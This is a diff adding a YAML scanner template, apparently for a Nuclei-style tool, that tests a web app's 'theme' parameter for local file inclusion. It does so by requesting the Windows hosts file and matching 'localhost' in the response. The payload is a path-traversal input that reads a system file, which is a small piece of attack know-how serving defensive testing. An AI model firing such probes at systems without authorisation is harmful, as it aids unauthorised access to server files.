@@ -1,0 +1,20 @@
+id: lfi3-059
+name: 'Traversal to system file via theme'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via theme'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      theme:
+        - 'C:\Windows\System32\drivers\etc\hosts'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'localhost'
